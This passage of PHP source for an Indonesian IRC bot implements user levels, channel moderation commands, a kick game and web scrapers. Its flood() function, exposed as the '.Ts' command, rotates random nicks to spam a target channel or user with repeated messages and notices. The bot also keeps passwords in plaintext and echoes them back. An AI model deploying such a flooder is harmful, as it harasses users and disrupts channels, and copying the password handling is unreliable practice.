                    $this->msg($sock,$user,''.$anick.' DeL YoU To '.$auth["$user"]["status"].' LIsT');
                    unset($auth["$user"]["name"]); unset($auth["$user"]["pass"]); unset($auth["$user"]["status"]);unset($auth["$user"]["auth"]); unset($auth["$user"]["time"]);
                    unset($auth["$user"]["ident"]); unset($auth["$user"]["host"]);unset($auth["$user"]["seen"]); unset($auth["$user"]);
                } else { $this->msg($sock,$nick,'Wrong Command! Type: .Deluser <nick>'); }
            }
	}
    }
    function chgpass_user($sock,$nick,$oldpass,$newpass){
        global $auth;
        $anick=$nick;
        $nick = strtolower($nick);
        if ($auth["$nick"]["auth"]==2) {
	    if ($oldpass===$auth["$nick"]["pass"]) {
		$auth["$nick"]["pass"] = $newpass;
                $this->notice($sock,$nick,'Password set to: 4'.$auth["$nick"]["pass"].'4');
            } else {$this->msg($sock,$nick,'PASSWORD 4!FaILED!');}
	}
    }
    function level_user($nick){
        global $auth;
        $nick=strtolower($nick);
        if ($auth["$nick"]["status"]=="user"){$stauth=1;}
	elseif ($auth["$nick"]["status"]=="master"){$stauth=2;}
	elseif (strtolower($auth["$nick"]["status"])=="admin"){$stauth=3;}
        elseif (strtolower($auth["$nick"]["status"])=="owner"){$stauth=4;}
        else{$stauth=0;};
        return $stauth;
    }
    function is_userbot($nick){
        global $auth;
        $isuser=0;$nick=strtolower($nick);
        if ($auth["$nick"]) {if ($auth["$nick"]["pass"]) {$isuser=1;}}
        return $isuser;
    }
    function is_loginbot($nick,$ident,$host){
        global $auth;
        $islogin=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($auth["$nick"]["auth"]==2){
                if($auth["$nick"]["ident"]==$ident){
                    if($auth["$nick"]["host"]==$host){
                        $timelog=time()- $auth["$nick"]["time"];
                        if($timelog<=3600){ $auth["$nick"]["time"]=time();$islogin=1;}else{$auth["$nick"]["auth"]=1;}
                    }else{$auth["$nick"]["auth"]=1;}
                }else{$auth["$nick"]["auth"]=1;}
            }else{$auth["$nick"]["auth"]=1;}
        }
        return $islogin;
    }
    function loginbot($nick,$ident,$host,$pass){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
            if($pass===$auth["$nick"]["pass"]){
                $auth["$nick"]["auth"]=2;$auth["$nick"]["time"]=time();$sukseslog=1;
            }
        }
        return $sukseslog;
    }
    function logoutbot($nick){
        global $auth;
        $sukseslog=0;$nick=strtolower($nick);
        if($this->is_userbot($nick)==1){
                $auth["$nick"]["auth"]=1;$auth["$nick"]["time"]=time();$sukseslog=1;
        }
        return $sukseslog;
    }
    ###############################
    
    function stuf_ping($sock,$chan,$nick){
        global $ping;
        $sendping=time();$ping["$sendping"]["ping"] = time();
	$ping["$sendping"]["chan"] = $chan;$ping["$sendping"]["nick"] = strtolower($nick);
	$this->msg($sock,$nick,'PING '.$ping["$sendping"]["ping"].'');
    }
    function stuf_lag($sock,$nick,$dataping){
        global $ping;
        $dataping=str_replace(chr(1),"",$dataping);$dataping=str_replace("\r","",$dataping);
        $dataping=str_replace("\n","",$dataping);$dataping=str_replace("","",$dataping);
        if ($ping["$dataping"]["ping"]==$dataping && $ping["$dataping"]["nick"]==strtolower($nick)){
            $pong = time();$pptime = $pong - $dataping;$meni = "";
            $wakptime=$pptime;
            if ($pptime>=60) {
                $bag = $pptime / 60;$meni = floor($bag)."mins ";$sis = $pptime - ($meni*60);$pptime = $sis;
            }
            $deti = $pptime."secs";$pptime = "$meni$deti";
            $mswktny=array("0","1","2","3","4","5","6","7","8","9");
            $ttlny =array("32","42","46","48","56","62");
            $wktny1 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny2 = $mswktny[rand(0,count($mswktny) - 1)];
            $wktny3 = $mswktny[rand(0,count($mswktny) - 1)];
            $ttlar= $ttlny[rand(0,count($ttlny) - 1)];
            $mswktny = ( $wktny1.$wktny2.$wktny3 );
            $wktuping = ( $wakptime.'.'.$mswktny );
            if ($wakptime<=5){$stping="2Menurut Ramalan saya 1";
            }elseif($wakptime>=5){$stping="12Tenang Masih belum Lag benar4";
            }elseif($wakptime>=10){$stping="11Lag Kasihan :D 9";
            }elseif($wakptime>=15){$stping="4Macet ya 13";
            }elseif($wakptime>=20){$stping="13Ganti server kwa supaya nda lag 4";
            }elseif($wakptime>=25){$stping="GANTI ISP SANA";
            }
            $this->msg($sock,$ping["$dataping"]["chan"],'from 5[4'.$nick.'5]: gate 5[4cap='.$wktuping.'5]botol CT=->'.$ttlar);
            $this->notice($sock,$nick,$stping.$nick);
            unset($ping["$dataping"]["nick"]);unset($ping["$dataping"]["ping"]);unset($ping["$dataping"]["chan"]);
        }
    }
    #############################
    function stuf_potong($sock,$nickna,$chan,$pilwar){
        global $warnabenar,$bw,$targetboom,$goboom,$onboom,$chanboom;
        $pilihanwar=strtolower($pilwar);$warnabenar=strtolower($warnabenar);
        if(strtolower($nickna)==strtolower($targetboom) && strtolower($chanboom)==strtolower($chan)){
            if($pilihanwar==strtolower($bw[0]) || $pilihanwar==strtolower($bw[1]) || $pilihanwar=="biru" ){
                if($warnabenar==$pilihanwar){
                    $this->msg($sock,$chan,'Selamat '.$nickna.', kamu berhasil menjinakan Bom!!');
                    $this->mode($sock,'+vvv',$chan,$nickna);
		}
		else{
                  //  $this->kickserv($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Gitulohhhh...');
                    $this->kick($sock,$chan,$nickna,'0,4BOOOOOOMMMM!!!!! Gitulohhhh....');
		}
                $goboom=0;$onboom="off";$targetboom="";$chanboom="";
           }
        }
    }
    function stuf_bom($sock,$chan,$targetbm){
        global $chanboom,$bot,$onboom,$warnaboom,$targetboom,$bw,$goboom,$tmpwbom,$tmboom,$warnabenar,$timeboom;
        if(strpos(strtolower($this->show_nickchan($chan)),' '.strtolower($targetbm).' ') && $onboom=="off" && $targetbm!=strtolower($bot['nick'])){
            $onboom="on";$goboom=0;$targetboom=$targetbm;$chanboom=$chan;
            $tmpwbom=$warnaboom;$wrnb=explode(";",$tmpwbom);
            $bw[0]=$wrnb[rand(0,count($wrnb) - 1)];unset($wrnb);
            $tmpwbom=str_replace($bw[0],"",$tmpwbom);$tmpwbom=str_replace(";;",";",$tmpwbom);
            $wrnb=explode(";",$tmpwbom);
            $bw[1]=$wrnb[rand(0,count($wrnb) - 1)];
            unset($wrnb);
            $tmboom=time();$warnabenar=$bw[rand(0,count($bw) - 1)];
            $this->act($sock,$chan,'memasukan celana dalam ke dalam baju '.$targetbm .' '.$warnabenar);
            $this->msg($sock,$chan,$targetbm.'!! nga pe waktu ['.$timeboom.'] detik. Jinakkan celana dalam dengan se kaluar yg butul. Dan hanya ada tiga celana dalam. '.$bw[0] .', '.$bw[1].' dan Biru');
       }
    }
    #############################
    function stuf_ison($sock,$msg){
        global $listison,$chanson,$ada2,$ada1;
        $listson=strtolower($msg);$xpgetison=explode(" ",$listson);
	$i=0;$jmlolol=0;
	foreach ($xpgetison as $pgetlist){if($pgetlist){$i++;$sonson[$i]=$pgetlist;$jmlolol=$i;}}
	$i=0;
	foreach ($listison as $pgetlist){if ($pgetlist){$i++;$lsonson[$i]=$pgetlist;$jmlson=$i;}}
	$dafonline="";$dafoffline="";
	for ($i = 1; $i <= $jmlson; $i++) {
            $satup=$lsonson[$i];$ds=0;
            for ($p = 1; $p <= $jmlolol; $p++) {if ($satup==$sonson[$p]){$ds=1;}}
            if ($ds==1){if(!$ada1["$satup"]){$dafonline .=$satup.' ';$ada1["$satup"]=true;$ada2["$satup"]=false;}}
            else{if(!$ada2["$satup"]){$dafoffline .=$satup.' ';$ada2["$satup"]=true;$ada1["$satup"]=false;}}
	}
	$dafonline=ltrim($dafonline);$dafonline=rtrim($dafonline);$dafoffline=ltrim($dafoffline);$dafoffline=rtrim($dafoffline);
	if ($dafonline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) ada oll cevaz : '.$dafonline . CRLF);}
	if ($dafoffline){fputs($sock, 'PRIVMSG '. $chanson .' :15(04Ison15) quit dia cevaz : '.$dafoffline . CRLF);}
	unset($lsonson);unset($sonson);
    }
    function add_ison($str){
        global $listison;
        $str=strtolower($str);
        if(in_array($str,$listison)){return 0;}
        else{array_push($listison,$str);return 1;}
        
    }
    function show_ison(){
        global $listison;
        $str_ison="";
        foreach ($listison as $lstr){$str_ison.=$lstr . ' ';}
        $str_ison=str_replace("  "," ",$str_ison);$str_ison=ltrim($str_ison);$str_ison=rtrim($str_ison);
        return $str_ison;
    }
    function del_ison($str){
        global $listison;
        $str_ison="";$str=strtolower($str);
        if(in_array($str,$listison)){
            foreach ($listison as $lstr){
                if(strtolower($str)!=strtolower($lstr)){
                    $str_ison.=$lstr . ';';
                }
            }
            $str_ison=str_replace(";;",";",$str_ison);$str_ison=ltrim($str_ison,";");$str_ison=rtrim($str_ison,";");
            $listison=explode(";",strtolower($str_ison));
            return 1;
        }
        else{return 0;}
    }
    ###############################
    function auto_cy($sock){
        global $systembot,$user_chan_arr;
        $this->send($sock,"PING :88888654476");
        foreach ($user_chan_arr as $cur_xchan) {
            if($systembot['AUTOCYCLE'][strtoupper($cur_xchan["chan"])]=="3ON"){
                $this->part($sock,$cur_xchan["chan"],$this->rnd_cycle());sleep (2);$this->join($sock,$cur_xchan["chan"]);sleep(3);
            }
	}
        return "";
    }
    
    ##############################
    function mod_astro($astro){
        global $zodiak;
        $astro = strtolower($astro);
        $this->send($sock,"PING :1097658652");
        if (in_array($astro, $zodiak)) {
            $pages = "http://www.astaga.com/astrologi/?cat=$astro";
            $handi = fopen ($pages, "rb");
            $konten = "";
            do {
               $baris = fread($handi, 512);
               if (strlen($baris) == 0) { break; }
               $konten .= $baris;
            } while(true);
            fclose ($handi);
            $this->send($sock,"PING :1097658651");
            $zod1 = stristr($konten,'<td id=ast><p>');
            $zod2 = stristr($zod1,'</table>');
            $bintang = str_replace($zod2,"",$zod1);
            $bintang = str_replace("\n","",$bintang);
            $bintang = str_replace("<td id=ast><p>","".ucfirst(strtolower($astro))." ",$bintang);
            $bintang = str_replace("</p>"," ",$bintang);
            $bintang = str_replace("<p><b>","",$bintang);
            $bintang = str_replace("</b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("<b>","",$bintang);
            $bintang = str_replace("</td>","",$bintang);
            $bintang = str_replace("</tr>","",$bintang);
            $bintang = str_replace("<tr>","",$bintang);
            $zod3 = stristr($bintang,'<td colspan=2 id=ast bgcolor="#e0e0e0">');
            $bintang = str_replace($zod3,"",$bintang);
            return $bintang;
        }
        else{
            return "Maaf nama bintang yg km masukan tdk ada";
        }

    }
    function mod_uspoof($sock,$msg){
        global $isisp,$jmlspoof;
        $this->send($sock,"PING :0000927651");
        $spoof=strtolower($msg);
	$spallnet = "http://www.allnetwork.or.id/Pendaftaran/Personal_spoof/?mode=view&server=$spoof";
	///$spallnet="http://localhost/spoof1.html";
	$handisp = fopen ($spallnet, "rb");
	$kontensp = "";
        do {
		$barissp = fread($handisp, 512);
		if (strlen($barissp) == 0) { break; }
		$kontensp .= $barissp;
	} while(true);
	fclose ($handisp);
	$kontensp=strtolower($kontensp);
	$kontensp = str_replace("  "," ",$kontensp);
	$kontensp = str_replace("\n","",$kontensp);
	$kontensp = str_replace(chr(9),"",$kontensp);
	$kontensp = str_replace("\r","",$kontensp);
	$kontensp = str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$kontensp);
	for ($i = 1; $i <= 10; $i++) {$kontensp = str_replace("  "," ",$kontensp);}
	$kontensp = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$kontensp);
	$tmpjml1=stristr($kontensp,"<tr bgcolor=yellow><td colspan=10 align=right>found ");
	$tmpjml2=stristr($kontensp," data</td></tr>");
								
	$tmpjml=str_replace($tmpjml2,"",$tmpjml1);
	$tmpjml=str_replace("<tr bgcolor=yellow><td colspan=10 align=right>found ","",$tmpjml);
	$kontensp = str_replace("</td> <td>","</td><td>",$kontensp);
	$kontensp = str_replace("<tr bgcolor=white> <td align=right>","<tr bgcolor=white><td align=right>",$kontensp);
	$kontensp = str_replace("</tr> <tr","</tr><tr",$kontensp);
	$kontensp =  str_replace(" </td>","</td>",$kontensp);
	$kontensp =str_replace("> <td","><td",$kontensp);
        
        for ($i = 1; $i <= $tmpjml; $i++) {
		if ($i==$tmpjml){
                        $identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=#1b6cf7>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
		else{
			$identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=white>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
								
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
                
	}
        $jmlspoof["$spoof"]=$tmpjml;
        return $jmlspoof["$spoof"];
    }
    function mod_uslang($sock,$msg){
        global $kmusedan,$kmjml;
        //$urledan="http://localhost/aa.html";
        $urledan="http://www.malesbanget.com/kamus/definisi.php?kata=".$msg;
        $btsstr='<td class='.chr(34).'BOX'.chr(34).'><span class='.chr(34).'KAMUS'.chr(34).'><span class='.chr(34).'kecil'.chr(34).'>';
        $btsstrtab1='<table width='.chr(34).'100%'.chr(34).' border='.chr(34).'0'.chr(34).' cellpadding='.chr(34).'0'.chr(34).' cellspacing='.chr(34).'0'.chr(34).'>';
        $btsstrtab2='</table>';
        $strsplit='<h2 align='.chr(34).'left'.chr(34).'>';
        $kedan = fopen ($urledan, "rb");
        $cotedan = "";
        do {
                $bcotedan = fread($kedan, 1024);
                if (strlen($bcotedan) == 0) { break; }
                $cotedan .= $bcotedan;
        } while(true);
        fclose ($kedan);
        if(strpos($cotedan,$btsstr)){
            $cotedan=substr($cotedan,strpos($cotedan,$btsstr) + strlen($btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,$btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,'<p><span class='.chr(34).'signature'.chr(34).'>'));
            $intedan=substr_count($cotedan,"  ");
            for ($i = 1; $i <= $intedan; $i++) {$cotedan=str_replace("  "," ",$cotedan);}
            $intedan=substr_count($cotedan,$btsstrtab1);
            for ($i = 1; $i <= $intedan; $i++) {
            $tmpctedan='';
            $tmpctedan=substr($cotedan,strpos($cotedan,$btsstrtab1));
            $tmpctedan=substr($tmpctedan,0,strpos($tmpctedan,$btsstrtab2) + strlen($btsstrtab2));
            $cotedan=str_replace($tmpctedan,"",$cotedan);
            }
            if(strpos($cotedan,'</span></span></td>')){$cotedan=substr($cotedan,0,strpos($cotedan,'</span></span></td>'));}
            $cotedan=ltrim($cotedan);$cotedan=rtrim($cotedan);
            if(substr($cotedan,0,strlen($strsplit))==$strsplit){$cotedan=substr($cotedan,strlen($strsplit));}
            $cotedan=str_replace('</h2>','',$cotedan);
            $arredan=explode($strsplit,$cotedan);
            for ($i = 0; $i < count($arredan); $i++) {
                    $arredan[$i]=str_replace("\n","",$arredan[$i]);$arredan[$i]=str_replace("\r","",$arredan[$i]);
                    $arredan[$i]=str_replace('<br><br>','<br>',$arredan[$i]);
                    $arredan[$i]=substr($arredan[$i],strpos($arredan[$i],'</span>')+7);$arredan[$i]='<span>'.ltrim($arredan[$i]);
                    $batas=strpos($arredan[$i],"<span>")+6;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span>");$tmpbts=substr($tmpbts,0,$batas);$kmusedan[$i]["kata"]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi'.chr(34).'>')+17;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</p><p");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);$kmusedan[$i]["definisi"][strtolower($msg)]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi_contoh'.chr(34).'>')+24;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span></p>");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts=str_replace("<em>","",$tmpbts);$tmpbts=str_replace("</em>","",$tmpbts);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);
                    $kmusedan[$i]["contoh"][strtolower($msg)]=$tmpbts;
                    $kmusedan[$i]["kata"][strtolower($msg)]=strtolower($ktslang);
                    $totalnya++;
            }
        }
        if($totalnya==""){$totalnya=0;}
        $kmjml[strtolower($msg)]=$totalnya;
        return $totalnya;
    }
    ##############################
    function flood($sock,$target,$msg){
        global $bot,$tsu,$haltfl;
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $nicknofl=$bot['nick'];$lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$target)+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(2);
        if (ereg("#", $target)) {$this->join($sock,$target);}$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);


        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(3);$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        
        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(4);$katafl=$this->rnd_flod();
            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);;sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        if (ereg("#", $target)) {$this->part($sock,$target,$katafl);}
        sleep(3);$this->nick($sock,$nicknofl);sleep(1);$haltfl['time']=time();$haltfl['on']=1;
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
    function floodctctp($sock,$target){
        
    }
    
    ###############################
    function mod_help($sock,$nick){
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $lvlbot=$this->level_user($nick);
        $this->send($sock,"PING :0009927651");
        $this->msg($sock,$nick,$this->rnd_logo() .' PHP-IRC v1.3' . " - RuNNINg WiTH PHpBoT by FIXEDSYS ");
        $this->msg($sock,$nick,"BOT COMMAND..!");sleep (2);
        
        $this->msg($sock,$nick,"12^Login <password> 4- 2Login To Bot");sleep(1);
        $this->msg($sock,$nick,"12^Logout 4- 2Logout From Bot");sleep(2);
        
        if($lvlbot>1){
        $this->msg($sock,$nick,"12.Up 4- 2Op Bot");sleep(2);
        $this->msg($sock,$nick,"12.Down 4- 2Deop Bot");sleep(2);
        $this->msg($sock,$nick,"12.O |#chan| <nick> 4- 2Op Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Do |#chan| <nick> 4- 2DeOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.H |#chan| <nick> 4- 2HalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Dh |#chan| <nick> 4- 2DeHalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.V |#chan| <nick> 4- 2Voice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.Dv |#chan| <nick> 4- 2DeVoice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,"12.K |#chan| <nick> |msg| 4- 2Kick Spesified Nick");sleep(1);
        $this->msg($sock,$nick,"12.Kc |#chan| <nick> |msg| 4- 2Kick Spesified Nick (ChanServ Stuf)");sleep(2);
        $this->msg($sock,$nick,"12.Kb |#chan| <nick> |msg| 4- 2KickBan Spesified Nick");sleep(2);
        $this->msg($sock,$nick,"12.B |#chan| <nick|hostmask> 4- 2Ban Nick Or Hostmask");sleep(1);
        $this->msg($sock,$nick,"12.Ub |#chan| <nick|hostmask> 4- 2UnBan Nick Or Hostmask");sleep(2);
        }
        $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"12.J <#chan> 4- 2Join Specified Channel");sleep (1);
        $this->msg($sock,$nick,"12.P <#chan> |msg| 4- 2Part Specified Channel");sleep (1);
        $this->msg($sock,$nick,"12.Cy <#chan> |msg| 4- 2Cycle On Specified Channel");sleep (2);
        
        if($lvlbot>2){
        $this->msg($sock,$nick,"12.N <newnick> 4- 2Change Nick");sleep(2);
        $this->msg($sock,$nick,"12.S |#chan/nick| <msg> 4- 2Msg Channel Or Person");sleep (2);
        $this->msg($sock,$nick,"12.A |#chan/nick| <text> 4- 2Action With Spesified Text");sleep(2);
        $this->msg($sock,$nick,"12.Ts <#chan/nick> |msg| 4- 2Flood!");sleep(1);
        }
        if($lvlbot>3){$this->msg($sock,$nick,"12.Q <msg> 4- 2Kill Bot");}
        
        if($lvlbot>2){
            $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"SYSTEM COMMAND..!");sleep(1);
        $this->msg($sock,$nick,"12.Server <server> 4- 2Push Bot To Use Spec Server");sleep(2);
        $this->msg($sock,$nick,"12.Servpass <password> 4- 2Use Spec Server Password");sleep(2);
        $this->msg($sock,$nick,"12.Vhost <host> 4- 2Changing Bot Vhost");sleep(2);
        $this->msg($sock,$nick,"12.Ident <identify> 4- 2Changing Bot Ident");sleep(1);
        $this->msg($sock,$nick,"12.Realname <realname> 4- 2Changing Bot Realname");sleep(2);
        $this->msg($sock,$nick,"12.Jump 4- 2Restarting bot also Accept Setting");sleep(1);
        }
        $this->msg($sock,$nick,"12.Chgpass <OldPass> <NewPass> 4- 2Change your pass");sleep(2);
        if($lvlbot >1){
            $this->msg($sock,$nick,"12.Adduser <NickUser> <PassUser> <LevelUser> 4- 2Add nick for my userlist");sleep(2);
            $this->msg($sock,$nick,"12.Deluser <NickUser> 4- 2Remove user from my userlist");sleep(2);
            $this->msg($sock,$nick,"12.BotNick 4- 2Nick Bot");sleep(2);
            $this->send($sock,"PING :0009927652");sleep(1);
            $this->msg($sock,$nick,"12.IdentNick <nick> <password> 4- 2Identify To Nickserv");sleep(1);
            $this->msg($sock,$nick,"12.LogoutNick 4- 2Logout From Nickserv");sleep(2);
            $this->msg($sock,$nick,"12.Userlist 4- 2Show my userlist");sleep(2);
        }
        if($lvlbot>2){
        $this->msg($sock,$nick,"12.BaseChan <#chan> 4- 2Changing my BaseChan");sleep(2);
        $this->msg($sock,$nick,"12.Chanlist <#chan> 4- 2Show my chanlist");sleep(2);
        $this->msg($sock,$nick,"12.Nicklist <#chan> 4- 2Show Nicklist on Spec Channel");sleep(1);
        $this->msg($sock,$nick,"12.Showison 4- 2Show my ison list");sleep(2);
        $this->msg($sock,$nick,"12.Chanison <#chan> 4- 2Changing my Ison Chan");sleep(2);
        $this->msg($sock,$nick,"12.Settimercycle <detik> 4- 2Change my delay of AutoCycle");sleep(1);
        $this->msg($sock,$nick,"12.max <Karakter X >4- 2 Set Max Karakter flood");sleep(1);
        $this->msg($sock,$nick,"12.flodban <on/off>4- 2 Set +b user flood");sleep(1);
        $this->msg($sock,$nick,"12.Repp <Repeat X >4- 2 Set Max Repeat");sleep(1);
        $this->msg($sock,$nick,"12.SetVersion <version> 4- 2Change my ctcp Version");sleep(2);
        $this->msg($sock,$nick,"12.SetFinger <finger> 4- 2Change my ctcp Finger");sleep(2);
        $this->msg($sock,$nick,"12.+/-Ping  <#chan> 4- 2Enable/Disable system Ping");sleep(2);
        $this->msg($sock,$nick,"12.+/-Whois  <#chan> 4- 2Enable/Disable system Whois");sleep(2);
        $this->msg($sock,$nick,"12.+/-Version <#chan> 4- 2Enable/Disable system Version");sleep(2);
        $this->msg($sock,$nick,"12.+/-Time <#chan> 4- 2Enable/Disable system Time");sleep(1);
        $this->msg($sock,$nick,"12.+/-Finger <#chan> 4- 2Enable/Disable system Finger");sleep(2);
        $this->msg($sock,$nick,"12.+/-Spoof <#chan> 4- 2Enable/Disable system Spoof");sleep(2);
        $this->msg($sock,$nick,"12.+/-Guard  <#chan> 4- 2Enable/Disable system Guard");sleep(2);
        $this->send($sock,"PING :0009927653");
        $this->msg($sock,$nick,"12.+/-NGOMONG  <#chan> 4- 2Enable/Disable bot crewet");sleep(2);
        $this->msg($sock,$nick,"12.+/-Jam <#chan> 4- 2Enable/Disable system waktu");sleep(1);
        $this->msg($sock,$nick,"12.+/-BADWORD  <#chan> 4- 2Enable/Disable guard badword");sleep(2);
        $this->msg($sock,$nick,"12.+/-Seen <#chan> 4- 2Enable/Disable system !Seen");sleep(1);
        $this->msg($sock,$nick,"12.+/-Gvoice <#chan> 4- 2Enable/Disable system Guard voice");sleep(1);
        $this->msg($sock,$nick,"12.+/-Jversion <#chan> 4- 2Enable/Disable system join version");sleep(1);
        $this->msg($sock,$nick,"12.+/-Astro <#chan> 4- 2Enable/Disable system Astro");sleep(2);
        $this->msg($sock,$nick,"12.+/-Kslang <#chan> 4- 2Enable/Disable system Kamus Slang");sleep(1);
        $this->msg($sock,$nick,"12.+/-Bom <#chan> 4- 2Enable/Disable system Bom");sleep(2);
        $this->msg($sock,$nick,"12.+/-Dns <#chan> 4- 2Enable/Disable system Dns");sleep(1);
        $this->msg($sock,$nick,"12.+/-IP <#chan> 4- 2Enable/Disable system Ip lIst");sleep(1);
        $this->msg($sock,$nick,"12.+/-Ison <#chan> 4- 2Enable/Disable system Ison");sleep(2);
        $this->msg($sock,$nick,"12.+/-Greet <#chan> 4- 2Enable/Disable system Greet");sleep(1);
        $this->msg($sock,$nick,"12.+/-AutoCycle <#chan> 4- 2Enable/Disable system AutoCycle");sleep(2);
        $this->msg($sock,$nick,"12.+/-AutoJoin 4- 2Enable/Disable system AutoJoin when kick");sleep(2);
        $this->msg($sock,$nick,"12.+/-AutoAway 4- 2Enable/Disable system Away when idle");sleep(2);
        $this->msg($sock,$nick,"12.+/-ListIson <nick> 4- 2Add/Remove Ison List");sleep(2);
        $this->msg($sock,$nick,"12.+/-ListGreet <nick> <pesan greet> 4- 2Add/Remove Greet List");sleep(1);
        }
        $this->msg($sock,$nick,"For more help ask my Owner");sleep(2);
        $this->msg($sock,$nick,"11Loaded 4by 12[11Invinitif CoMMuniTy12]");sleep(1);
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
}
################ [ END CLASS IRC BOT ] ###################
$clistt='nit';
do {
    $fp = fsockopen($bot['server'],$bot['port'], &$err_num, &$err_msg, 30);
    if(!$fp) {
	$attconnect++;
	print "Sorry, the server " . $bot['server']. " is not currently available!".CRLF;
	$bot['server']=$servdef[$attconnect-1];
	$bot['userver']=0;
	sleep(5);
	if ($attconnect >=$retry){
            $attconnect=0;
	}
    }
    else{
        $inaway['status']=0;
        $haltfl['on']=0;
        $res_chan="";
        $res_chan=$modbot->show_chan();
	$modbot->destroy_allchan();
        $attconnect=0;$rtdc++;
